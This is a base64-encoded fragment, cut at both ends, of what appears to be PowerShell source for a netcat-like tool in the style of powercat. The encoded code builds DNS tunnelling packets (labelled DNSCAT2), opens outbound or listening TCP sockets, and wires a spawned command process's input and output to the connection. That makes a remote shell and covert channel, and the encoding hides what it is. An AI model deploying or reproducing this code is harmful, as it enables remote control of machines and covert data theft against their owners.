U2Vzc2lvbklkICsgIjAwIiArICREb21haW4pCiAgICB9CgogICAgZnVuY3Rpb24gQ3JlYXRlX01TRwogICAgewogICAgICBwYXJhbSgkU2Vzc2lvbklkLCRTZXFOdW0sJEFja25vd2xlZGdlbWVudE51bWJlciwkRGF0YSwkVGFnLCREb21haW4pCiAgICAgIHJldHVybiAoJFRhZyArIChbc3RyaW5nXShHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTAwMCkpICsgIjAxIiArICRTZXNzaW9uSWQgKyAkU2VxTnVtICsgJEFja25vd2xlZGdlbWVudE51bWJlciArICREYXRhICsgJERvbWFpbikKICAgIH0KCiAgICBmdW5jdGlvbiBEZWNvZGVQYWNrZXQKICAgIHsKICAgICAgcGFyYW0oJFBhY2tldCkKCiAgICAgIGlmKCgoJFBhY2tldC5MZW5ndGgpJTIgLWVxIDEpIC1vciAoJFBhY2tldC5MZW5ndGggLWVxIDApKXtyZXR1cm4gMX0KICAgICAgJEFja25vd2xlZGdlbWVudE51bWJlciA9ICgkUGFja2V0WzEwLi4xM10gLWpvaW4gIiIpCiAgICAgICRTZXFOdW0gPSAoJFBhY2tldFsxNC4uMTddIC1qb2luICIiKQogICAgICBbYnl0ZVtdXSRSZXR1cm5pbmdEYXRhID0gQCgpCgogICAgICBpZigkUGFja2V0Lkxlbmd0aCAtZ3QgMTgpCiAgICAgIHsKICAgICAgICAkUGFja2V0RWxpbSA9ICRQYWNrZXQuU3Vic3RyaW5nKDE4KQogICAgICAgIHdoaWxlKCRQYWNrZXRFbGltLkxlbmd0aCAtZ3QgMCkKICAgICAgICB7CiAgICAgICAgICAkUmV0dXJuaW5nRGF0YSArPSBbYnl0ZVtdXVtDb252ZXJ0XTo6VG9JbnQxNigoJFBhY2tldEVsaW1bMC4uMV0gLWpvaW4gIiIpLDE2KQogICAgICAgICAgJFBhY2tldEVsaW0gPSAkUGFja2V0RWxpbS5TdWJzdHJpbmcoMikKICAgICAgICB9CiAgICAgIH0KCiAgICAgIHJldHVybiAkUGFja2V0LCRSZXR1cm5pbmdEYXRhLCRBY2tub3dsZWRnZW1lbnROdW1iZXIsJFNlcU51bQogICAgfQoKICAgIGZ1bmN0aW9uIEFja25vd2xlZGdlRGF0YQogICAgewogICAgICBwYXJhbSgkUmV0dXJuaW5nRGF0YSwkQWNrbm93bGVkZ2VtZW50TnVtYmVyKQogICAgICAkSGV4ID0gW3N0cmluZ10oInswOnh9IiAtZiAoKFt1aW50MTZdKCIweCIgKyAkQWNrbm93bGVkZ2VtZW50TnVtYmVyKSArICRSZXR1cm5pbmdEYXRhLkxlbmd0aCkgJSA2NTUzNSkpCiAgICAgIGlmKCRIZXguTGVuZ3RoIC1uZSA0KXskSGV4ID0gKCgiMCIqKDQtJEhleC5MZW5ndGgpKSArICRIZXgpfQogICAgICByZXR1cm4gJEhleAogICAgfQogICAgJEZ1bmNWYXJzID0gQHt9CiAgICAkRnVuY1ZhcnNbIkROU1NlcnZlciJdLCRGdW5jVmFyc1siRE5TUG9ydCJdLCRGdW5jVmFyc1siRG9tYWluIl0sJEZ1bmNWYXJzWyJGYWlsdXJlVGhyZXNob2xkIl0gPSAkRnVuY1NldHVwVmFycwogICAgaWYoJEZ1bmNWYXJzWyJETlNQb3J0Il0gLWVxICcnKXskRnVuY1ZhcnNbIkROU1BvcnQiXSA9ICI1MyJ9CiAgICAkRnVuY1ZhcnNbIlRhZyJdID0gIiIKICAgICRGdW5jVmFyc1siRG9tYWluIl0gPSAoIi4iICsgJEZ1bmNWYXJzWyJEb21haW4iXSkKCiAgICAkRnVuY1ZhcnNbIkNyZWF0ZV9TWU4iXSA9ICR7ZnVuY3Rpb246Q3JlYXRlX1NZTn0KICAgICRGdW5jVmFyc1siQ3JlYXRlX01TRyJdID0gJHtmdW5jdGlvbjpDcmVhdGVfTVNHfQogICAgJEZ1bmNWYXJzWyJDcmVhdGVfRklOIl0gPSAke2Z1bmN0aW9uOkNyZWF0ZV9GSU59CiAgICAkRnVuY1ZhcnNbIkRlY29kZVBhY2tldCJdID0gJHtmdW5jdGlvbjpEZWNvZGVQYWNrZXR9CiAgICAkRnVuY1ZhcnNbIkNvbnZlcnRUby1IZXhBcnJheSJdID0gJHtmdW5jdGlvbjpDb252ZXJ0VG8tSGV4QXJyYXl9CiAgICAkRnVuY1ZhcnNbIkFja0RhdGEiXSA9ICR7ZnVuY3Rpb246QWNrbm93bGVkZ2VEYXRhfQogICAgJEZ1bmNWYXJzWyJTZW5kUGFja2V0Il0gPSAke2Z1bmN0aW9uOlNlbmRQYWNrZXR9CiAgICAkRnVuY1ZhcnNbIlNlc3Npb25JZCJdID0gKFtzdHJpbmddKEdldC1SYW5kb20gLU1heGltdW0gOTk5OSAtTWluaW11bSAxMDAwKSkKICAgICRGdW5jVmFyc1siU2VxTnVtIl0gPSAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKQogICAgJEZ1bmNWYXJzWyJFbmNvZGluZyJdID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nCiAgICAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gPSAwCgogICAgJFNZTlBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkNyZWF0ZV9TWU4iXSAtQXJndW1lbnRMaXN0IEAoJEZ1bmNWYXJzWyJTZXNzaW9uSWQiXSwkRnVuY1ZhcnNbIlNlcU51bSJdLCRGdW5jVmFyc1siVGFnIl0sJEZ1bmNWYXJzWyJEb21haW4iXSkpCiAgICAkUmVzcG9uc2VQYWNrZXQgPSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJTZW5kUGFja2V0Il0gLUFyZ3VtZW50TGlzdCBAKCRTWU5QYWNrZXQsJEZ1bmNWYXJzWyJETlNTZXJ2ZXIiXSwkRnVuY1ZhcnNbIkROU1BvcnQiXSkpCiAgICAkRGVjb2RlZFBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkRlY29kZVBhY2tldCJdIC1Bcmd1bWVudExpc3QgQCgkUmVzcG9uc2VQYWNrZXQpKQogICAgaWYoJERlY29kZWRQYWNrZXQgLWVxIDEpe3JldHVybiAiQmFkIFNZTiByZXNwb25zZS4gRW5zdXJlIHlvdXIgc2VydmVyIGlzIHNldCB1cCBjb3JyZWN0bHkuIn0KICAgICRSZXR1cm5pbmdEYXRhID0gJERlY29kZWRQYWNrZXRbMV0KICAgIGlmKCRSZXR1cm5pbmdEYXRhIC1uZSAiIil7JEZ1bmNWYXJzWyJJbnB1dERhdGEiXSA9ICIifQogICAgJEZ1bmNWYXJzWyJBY2tOdW0iXSA9ICREZWNvZGVkUGFja2V0WzJdCiAgICAkRnVuY1ZhcnNbIk1heE1TR0RhdGFTaXplIl0gPSAoMjQ0IC0gKEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQ3JlYXRlX01TRyJdIC1Bcmd1bWVudExpc3QgQCgkRnVuY1ZhcnNbIlNlc3Npb25JZCJdLCRGdW5jVmFyc1siU2VxTnVtIl0sJEZ1bmNWYXJzWyJBY2tOdW0iXSwiIiwkRnVuY1ZhcnNbIlRhZyJdLCRGdW5jVmFyc1siRG9tYWluIl0pKS5MZW5ndGgpCiAgICBpZigkRnVuY1ZhcnNbIk1heE1TR0RhdGFTaXplIl0gLWxlIDApe3JldHVybiAiRG9tYWluIG5hbWUgaXMgdG9vIGxvbmcuIn0KICAgIHJldHVybiAkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gUmVhZERhdGFfRE5TCiAgewogICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgaWYoJGdsb2JhbDpWZXJib3NlKXskVmVyYm9zZSA9ICRUcnVlfQoKICAgICRQYWNrZXRzRGF0YSA9IEAoKQogICAgJFBhY2tldERhdGEgPSAiIgoKICAgIGlmKCRGdW5jVmFyc1siSW5wdXREYXRhIl0gLW5lICRudWxsKQogICAgewogICAgICAkSGV4ID0gKEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQ29udmVydFRvLUhleEFycmF5Il0gLUFyZ3VtZW50TGlzdCBAKCRGdW5jVmFyc1siSW5wdXREYXRhIl0pKQogICAgICAkU2VjdGlvbkNvdW50ID0gMAogICAgICAkUGFja2V0Q291bnQgPSAwCiAgICAgIGZvcmVhY2goJENoYXIgaW4gJEhleCkKICAgICAgewogICAgICAgIGlmKCRTZWN0aW9uQ291bnQgLWdlIDMwKQogICAgICAgIHsKICAgICAgICAgICRTZWN0aW9uQ291bnQgPSAwCiAgICAgICAgICAkUGFja2V0RGF0YSArPSAiLiIKICAgICAgICB9CiAgICAgICAgaWYoJFBhY2tldENvdW50IC1nZSAoJEZ1bmNWYXJzWyJNYXhNU0dEYXRhU2l6ZSJdKSkKICAgICAgICB7CiAgICAgICAgICAkUGFja2V0c0RhdGEgKz0gJFBhY2tldERhdGEuVHJpbUVuZCgiLiIpCiAgICAgICAgICAkUGFja2V0Q291bnQgPSAwCiAgICAgICAgICAkU2VjdGlvbkNvdW50ID0gMAogICAgICAgICAgJFBhY2tldERhdGEgPSAiIgogICAgICAgIH0KICAgICAgICAkUGFja2V0RGF0YSArPSAkQ2hhcgogICAgICAgICRTZWN0aW9uQ291bnQgKz0gMgogICAgICAgICRQYWNrZXRDb3VudCArPSAyCiAgICAgIH0KICAgICAgJFBhY2tldERhdGEgPSAkUGFja2V0RGF0YS5UcmltRW5kKCIuIikKICAgICAgJFBhY2tldHNEYXRhICs9ICRQYWNrZXREYXRhCiAgICAgICRGdW5jVmFyc1siSW5wdXREYXRhIl0gPSAiIgogICAgfQogICAgZWxzZQogICAgewogICAgICAkUGFja2V0c0RhdGEgPSBAKCIiKQogICAgfQoKICAgIFtieXRlW11dJFJldHVybmluZ0RhdGEgPSBAKCkKICAgIGZvcmVhY2goJFBhY2tldERhdGEgaW4gJFBhY2tldHNEYXRhKQogICAgewogICAgICB0cnl7JE1TR1BhY2tldCA9IEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQ3JlYXRlX01TRyJdIC1Bcmd1bWVudExpc3QgQCgkRnVuY1ZhcnNbIlNlc3Npb25JZCJdLCRGdW5jVmFyc1siU2VxTnVtIl0sJEZ1bmNWYXJzWyJBY2tOdW0iXSwkUGFja2V0RGF0YSwkRnVuY1ZhcnNbIlRhZyJdLCRGdW5jVmFyc1siRG9tYWluIl0pfQogICAgICBjYXRjaHsgV3JpdGUtVmVyYm9zZSAiRE5TQ0FUMjogRmFpbGVkIHRvIGNyZWF0ZSBwYWNrZXQuIiA7ICRGdW5jVmFyc1siRmFpbHVyZXMiXSArPSAxIDsgY29udGludWUgfQogICAgICB0cnl7JFBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIlNlbmRQYWNrZXQiXSAtQXJndW1lbnRMaXN0IEAoJE1TR1BhY2tldCwkRnVuY1ZhcnNbIkROU1NlcnZlciJdLCRGdW5jVmFyc1siRE5TUG9ydCJdKSl9CiAgICAgIGNhdGNoeyBXcml0ZS1WZXJib3NlICJETlNDQVQyOiBGYWlsZWQgdG8gc2VuZCBwYWNrZXQuIiA7ICRGdW5jVmFyc1siRmFpbHVyZXMiXSArPSAxIDsgY29udGludWUgfQogICAgICB0cnkKICAgICAgewogICAgICAgICREZWNvZGVkUGFja2V0ID0gKEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siRGVjb2RlUGFja2V0Il0gLUFyZ3VtZW50TGlzdCBAKCRQYWNrZXQpKQogICAgICAgIGlmKCREZWNvZGVkUGFja2V0Lkxlbmd0aCAtbmUgNCl7IFdyaXRlLVZlcmJvc2UgIkROU0NBVDI6IEZhaWx1cmUgdG8gZGVjb2RlIHBhY2tldCwgZHJvcHBpbmcuLi4iOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0KICAgICAgICAkRnVuY1ZhcnNbIkFja051bSJdID0gJERlY29kZWRQYWNrZXRbMl0KICAgICAgICAkRnVuY1ZhcnNbIlNlcU51bSJdID0gJERlY29kZWRQYWNrZXRbM10KICAgICAgICAkUmV0dXJuaW5nRGF0YSArPSAkRGVjb2RlZFBhY2tldFsxXQogICAgICB9CiAgICAgIGNhdGNoeyBXcml0ZS1WZXJib3NlICJETlNDQVQyOiBGYWlsdXJlIHRvIGRlY29kZSBwYWNrZXQsIGRyb3BwaW5nLi4uIiA7ICRGdW5jVmFyc1siRmFpbHVyZXMiXSArPSAxIDsgY29udGludWUgfQogICAgICBpZigkRGVjb2RlZFBhY2tldCAtZXEgMSl7IFdyaXRlLVZlcmJvc2UgIkROU0NBVDI6IEZhaWx1cmUgdG8gZGVjb2RlIHBhY2tldCwgZHJvcHBpbmcuLi4iIDsgJEZ1bmNWYXJzWyJGYWlsdXJlcyJdICs9IDEgOyBjb250aW51ZSB9CiAgICB9CgogICAgaWYoJEZ1bmNWYXJzWyJGYWlsdXJlcyJdIC1nZSAkRnVuY1ZhcnNbIkZhaWx1cmVUaHJlc2hvbGQiXSl7YnJlYWt9CgogICAgaWYoJFJldHVybmluZ0RhdGEgLW5lIEAoKSkKICAgIHsKICAgICAgJEZ1bmNWYXJzWyJBY2tOdW0iXSA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkFja0RhdGEiXSAtQXJndW1lbnRMaXN0IEAoJFJldHVybmluZ0RhdGEsJEZ1bmNWYXJzWyJBY2tOdW0iXSkpCiAgICB9CiAgICByZXR1cm4gJFJldHVybmluZ0RhdGEsJEZ1bmNWYXJzCiAgfQogIGZ1bmN0aW9uIFdyaXRlRGF0YV9ETlMKICB7CiAgICBwYXJhbSgkRGF0YSwkRnVuY1ZhcnMpCiAgICAkRnVuY1ZhcnNbIklucHV0RGF0YSJdID0gJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldFN0cmluZygkRGF0YSkKICAgIHJldHVybiAkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gQ2xvc2VfRE5TCiAgewogICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgJEZJTlBhY2tldCA9IEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQ3JlYXRlX0ZJTiJdIC1Bcmd1bWVudExpc3QgQCgkRnVuY1ZhcnNbIlNlc3Npb25JZCJdLCRGdW5jVmFyc1siVGFnIl0sJEZ1bmNWYXJzWyJEb21haW4iXSkKICAgIEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siU2VuZFBhY2tldCJdIC1Bcmd1bWVudExpc3QgQCgkRklOUGFja2V0LCRGdW5jVmFyc1siRE5TU2VydmVyIl0sJEZ1bmNWYXJzWyJETlNQb3J0Il0pIHwgT3V0LU51bGwKICB9CiAgIyMjIyMjIyMjIyMjIyMjIEROUyBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCgogICMjIyMjIyMjIyMgVENQIEZVTkNUSU9OUyAjIyMjIyMjIyMjCiAgZnVuY3Rpb24gU2V0dXBfVENQCiAgewogICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpCiAgICAkYywkbCwkcCwkdCA9ICRGdW5jU2V0dXBWYXJzCiAgICBpZigkZ2xvYmFsOlZlcmJvc2UpeyRWZXJib3NlID0gJFRydWV9CiAgICAkRnVuY1ZhcnMgPSBAe30KICAgIGlmKCEkbCkKICAgIHsKICAgICAgJEZ1bmNWYXJzWyJsIl0gPSAkRmFsc2UKICAgICAgJFNvY2tldCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRjcENsaWVudAogICAgICBXcml0ZS1WZXJib3NlICJDb25uZWN0aW5nLi4uIgogICAgICAkSGFuZGxlID0gJFNvY2tldC5CZWdpbkNvbm5lY3QoJGMsJHAsJG51bGwsJG51bGwpCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICRGdW5jVmFyc1sibCJdID0gJFRydWUKICAgICAgV3JpdGUtVmVyYm9zZSAoIkxpc3RlbmluZyBvbiBbMC4wLjAuMF0gKHBvcnQgIiArICRwICsgIikiKQogICAgICAkU29ja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwTGlzdGVuZXIgJHAKICAgICAgJFNvY2tldC5TdGFydCgpCiAgICAgICRIYW5kbGUgPSAkU29ja2V0LkJlZ2luQWNjZXB0VGNwQ2xpZW50KCRudWxsLCAkbnVsbCkKICAgIH0KCiAgICAkU3RvcHdhdGNoID0gW1N5c3RlbS5EaWFnbm9zdGljcy5TdG9wd2F0Y2hdOjpTdGFydE5ldygpCiAgICB3aGlsZSgkVHJ1ZSkKICAgIHsKICAgICAgaWYoJEhvc3QuVUkuUmF3VUkuS2V5QXZhaWxhYmxlKQogICAgICB7CiAgICAgICAgaWYoQCgxNywyNykgLWNvbnRhaW5zICgkSG9zdC5VSS5SYXdVSS5SZWFkS2V5KCJOb0VjaG8sSW5jbHVkZUtleURvd24sSW5jbHVkZUtleVVwIikuVmlydHVhbEtleUNvZGUpKQogICAgICAgIHsKICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNUUkwgb3IgRVNDIGNhdWdodC4gU3RvcHBpbmcgVENQIFNldHVwLi4uIgogICAgICAgICAgaWYoJEZ1bmNWYXJzWyJsIl0peyRTb2NrZXQuU3RvcCgpfQogICAgICAgICAgZWxzZXskU29ja2V0LkNsb3NlKCl9CiAgICAgICAgICAkU3RvcHdhdGNoLlN0b3AoKQogICAgICAgICAgYnJlYWsKICAgICAgICB9CiAgICAgIH0KICAgICAgaWYoJFN0b3B3YXRjaC5FbGFwc2VkLlRvdGFsU2Vjb25kcyAtZ3QgJHQpCiAgICAgIHsKICAgICAgICBpZighJGwpeyRTb2NrZXQuQ2xvc2UoKX0KICAgICAgICBlbHNleyRTb2NrZXQuU3RvcCgpfQogICAgICAgICRTdG9wd2F0Y2guU3RvcCgpCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiVGltZW91dCEiIDsgYnJlYWsKICAgICAgICBicmVhawogICAgICB9CiAgICAgIGlmKCRIYW5kbGUuSXNDb21wbGV0ZWQpCiAgICAgIHsKICAgICAgICBpZighJGwpCiAgICAgICAgewogICAgICAgICAgdHJ5CiAgICAgICAgICB7CiAgICAgICAgICAgICRTb2NrZXQuRW5kQ29ubmVjdCgkSGFuZGxlKQogICAgICAgICAgICAkU3RyZWFtID0gJFNvY2tldC5HZXRTdHJlYW0oKQogICAgICAgICAgICAkQnVmZmVyU2l6ZSA9ICRTb2NrZXQuUmVjZWl2ZUJ1ZmZlclNpemUKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIkNvbm5lY3Rpb24gdG8gIiArICRjICsgIjoiICsgJHAgKyAiIFt0Y3BdIHN1Y2NlZWRlZCEiKQogICAgICAgICAgfQogICAgICAgICAgY2F0Y2h7JFNvY2tldC5DbG9zZSgpOyAkU3RvcHdhdGNoLlN0b3AoKTsgYnJlYWt9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAkQ2xpZW50ID0gJFNvY2tldC5FbmRBY2NlcHRUY3BDbGllbnQoJEhhbmRsZSkKICAgICAgICAgICRTdHJlYW0gPSAkQ2xpZW50LkdldFN0cmVhbSgpCiAgICAgICAgICAkQnVmZmVyU2l6ZSA9ICRDbGllbnQuUmVjZWl2ZUJ1ZmZlclNpemUKICAgICAgICAgIFdyaXRlLVZlcmJvc2UgKCJDb25uZWN0aW9uIGZyb20gWyIgKyAkQ2xpZW50LkNsaWVudC5SZW1vdGVFbmRQb2ludC5BZGRyZXNzLklQQWRkcmVzc1RvU3RyaW5nICsgIl0gcG9ydCAiICsgJHBvcnQgKyAiIFt0Y3BdIGFjY2VwdGVkIChzb3VyY2UgcG9ydCAiICsgJENsaWVudC5DbGllbnQuUmVtb3RlRW5kUG9pbnQuUG9ydCArICIpIikKICAgICAgICB9CiAgICAgICAgYnJlYWsKICAgICAgfQogICAgfQogICAgJFN0b3B3YXRjaC5TdG9wKCkKICAgIGlmKCRTb2NrZXQgLWVxICRudWxsKXticmVha30KICAgICRGdW5jVmFyc1siU3RyZWFtIl0gPSAkU3RyZWFtCiAgICAkRnVuY1ZhcnNbIlNvY2tldCJdID0gJFNvY2tldAogICAgJEZ1bmNWYXJzWyJCdWZmZXJTaXplIl0gPSAkQnVmZmVyU2l6ZQogICAgJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdID0gKE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSAkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSkKICAgICRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJTdHJlYW0iXS5CZWdpblJlYWQoJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdLCAwLCAkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSwgJG51bGwsICRudWxsKQogICAgJEZ1bmNWYXJzWyJFbmNvZGluZyJdID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nCiAgICAkRnVuY1ZhcnNbIlN0cmVhbUJ5dGVzUmVhZCJdID0gMQogICAgcmV0dXJuICRGdW5jVmFycwogIH0KICBmdW5jdGlvbiBSZWFkRGF0YV9UQ1AKICB7CiAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAkRGF0YSA9ICRudWxsCiAgICBpZigkRnVuY1ZhcnNbIlN0cmVhbUJ5dGVzUmVhZCJdIC1lcSAwKXticmVha30KICAgIGlmKCRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdLklzQ29tcGxldGVkKQogICAgewogICAgICAkU3RyZWFtQnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJTdHJlYW0iXS5FbmRSZWFkKCRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdKQogICAgICBpZigkU3RyZWFtQnl0ZXNSZWFkIC1lcSAwKXticmVha30KICAgICAgJERhdGEgPSAkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl1bMC4uKFtpbnRdJFN0cmVhbUJ5dGVzUmVhZC0xKV0KICAgICAgJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlN0cmVhbSJdLkJlZ2luUmVhZCgkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl0sIDAsICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdLCAkbnVsbCwgJG51bGwpCiAgICB9CiAgICByZXR1cm4gJERhdGEsJEZ1bmNWYXJzCiAgfQogIGZ1bmN0aW9uIFdyaXRlRGF0YV9UQ1AKICB7CiAgICBwYXJhbSgkRGF0YSwkRnVuY1ZhcnMpCiAgICAkRnVuY1ZhcnNbIlN0cmVhbSJdLldyaXRlKCREYXRhLCAwLCAkRGF0YS5MZW5ndGgpCiAgICByZXR1cm4gJEZ1bmNWYXJzCiAgfQogIGZ1bmN0aW9uIENsb3NlX1RDUAogIHsKICAgIHBhcmFtKCRGdW5jVmFycykKICAgIHRyeXskRnVuY1ZhcnNbIlN0cmVhbSJdLkNsb3NlKCl9CiAgICBjYXRjaHt9CiAgICBpZigkRnVuY1ZhcnNbImwiXSl7JEZ1bmNWYXJzWyJTb2NrZXQiXS5TdG9wKCl9CiAgICBlbHNleyRGdW5jVmFyc1siU29ja2V0Il0uQ2xvc2UoKX0KICB9CiAgIyMjIyMjIyMjIyBUQ1AgRlVOQ1RJT05TICMjIyMjIyMjIyMKCiAgIyMjIyMjIyMjIyBDTUQgRlVOQ1RJT05TICMjIyMjIyMjIyMKICBmdW5jdGlvbiBTZXR1cF9DTUQKICB7CiAgICBwYXJhbSgkRnVuY1NldHVwVmFycykKICAgIGlmKCRnbG9iYWw6VmVyYm9zZSl7JFZlcmJvc2UgPSAkVHJ1ZX0KICAgICRGdW5jVmFycyA9IEB7fQogICAgJFByb2Nlc3NTdGFydEluZm8gPSBOZXctT2JqZWN0IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvCiAgICAkUHJvY2Vzc1N0YXJ0SW5mby5GaWxlTmFtZSA9ICRGdW5jU2V0dXBWYXJzWzBdCiAgICAkUHJvY2Vzc1N0YXJ0SW5mby5Vc2VTaGVsbEV4ZWN1dGUgPSAkRmFsc2UKICAgICRQcm9jZXNzU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRJbnB1dCA9ICRUcnVlCiAgICAkUHJvY2Vzc1N0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0ID0gJFRydWUKICAgICRQcm9jZXNzU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRFcnJvciA9ICRUcnVlCiAgICAkRnVuY1ZhcnNbIlByb2Nlc3MiXSA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc106OlN0YXJ0KCRQcm9jZXNzU3RhcnRJbmZvKQogICAgV3JpdGUtVmVyYm9zZSAoIlN0YXJ0aW5nIFByb2Nlc3MgIiArICRGdW5jU2V0dXBWYXJzWzBdICsgIi4uLiIpCiAgICAkRnVuY1ZhcnNbIlByb2Nlc3MiXS5TdGFydCgpIHwgT3V0LU51bGwKICAgICRGdW5jVmFyc1siU3RkT3V0RGVzdGluYXRpb25CdWZmZXIiXSA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSA2NTUzNgogICAgJEZ1bmNWYXJzWyJTdGRPdXRSZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlByb2Nlc3MiXS5TdGFuZGFyZE91dHB1dC5CYXNlU3RyZWFtLkJlZ2luUmVhZCgkRnVuY1ZhcnNbIlN0ZE91dERlc3RpbmF0aW9uQnVmZmVyIl0sIDAsIDY1NTM2LCAkbnVsbCwgJG51bGwpCiAgICAkRnVuY1ZhcnNbIlN0ZEVyckRlc3RpbmF0aW9uQnVmZmVyIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gNjU1MzYKICAgICRGdW5jVmFyc1siU3RkRXJyUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRFcnJvci5CYXNlU3RyZWFtLkJlZ2luUmVhZCgkRnVuY1ZhcnNbIlN0ZEVyckRlc3RpbmF0aW9uQnVmZmVyIl0sIDAsIDY1NTM2LCAkbnVsbCwgJG51bGwpCiAgICAkRnVuY1ZhcnNbIkVuY29kaW5nIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFzY2lpRW5jb2RpbmcKICAgIHJldHVybiAkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gUmVhZERhdGFfQ01ECiAgewogICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgW2J5dGVbXV0kRGF0YSA9IEAoKQogICAgaWYoJEZ1bmNWYXJzWyJTdGRPdXRSZWFkT3BlcmF0aW9uIl0uSXNDb21wbGV0ZWQpCiAgICB7CiAgICAgICRTdGRPdXRCeXRlc1JlYWQgPSAkRnVuY1ZhcnNbIlByb2Nlc3MiXS5TdGFuZGFyZE91dHB1dC5CYXNlU3RyZWFtLkVuZFJlYWQoJEZ1bmNWYXJzWyJTdGRPdXRSZWFkT3BlcmF0aW9uIl0pCiAgICAgIGlmKCRTdGRPdXRCeXRlc1JlYWQgLWVxIDApe2JyZWFrfQogICAgICAkRGF0YSArPSAkRnVuY1ZhcnNbIlN0ZE91dERlc3RpbmF0aW9uQnVmZmVyIl1bMC4uKFtpbnRdJFN0ZE91dEJ5dGVzUmVhZC0xKV0KICAgICAgJEZ1bmNWYXJzWyJTdGRPdXRSZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlByb2Nlc3MiXS5TdGFuZGFyZE91dHB1dC5CYXNlU3RyZWFtLkJlZ2luUmVhZCgkRnVuY1ZhcnNbIlN0ZE91dERlc3RpbmF0aW9uQnVmZmVyIl0sIDAsIDY1NTM2LCAkbnVsbCwgJG51bGwpCiAgICB9CiAgICBpZigkRnVuY1ZhcnNbIlN0ZEVyclJlYWRPcGVyYXRpb24iXS5Jc0NvbXBsZXRlZCkKICAgIHsKICAgICAgJFN0ZEVyckJ5dGVzUmVhZCA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkRXJyb3IuQmFzZVN0cmVhbS5FbmRSZWFkKCRGdW5jVmFyc1siU3RkRXJyUmVhZE9wZXJhdGlvbiJdKQogICAgICBpZigkU3RkRXJyQnl0ZXNSZWFkIC1lcSAwKXticmVha30KICAgICAgJERhdGEgKz0gJEZ1bmNWYXJzWyJTdGRFcnJEZXN0aW5hdGlvbkJ1ZmZlciJdWzAuLihbaW50XSRTdGRFcnJCeXRlc1JlYWQtMSldCiAgICAgICRGdW5jVmFyc1siU3RkRXJyUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRFcnJvci5CYXNlU3RyZWFtLkJlZ2luUmVhZCgkRnVuY1ZhcnNbIlN0ZEVyckRlc3RpbmF0aW9uQnVmZmVyIl0sIDAsIDY1NTM2LCAkbnVsbCwgJG51bGwpCiAgICB9CiAgICByZXR1cm4gJERhdGEsJEZ1bmNWYXJzCiAgfQogIGZ1bmN0aW9uIFdyaXRlRGF0YV9DTUQKICB7CiAgICBwYXJhbSgkRGF0YSwkRnVuY1ZhcnMpCi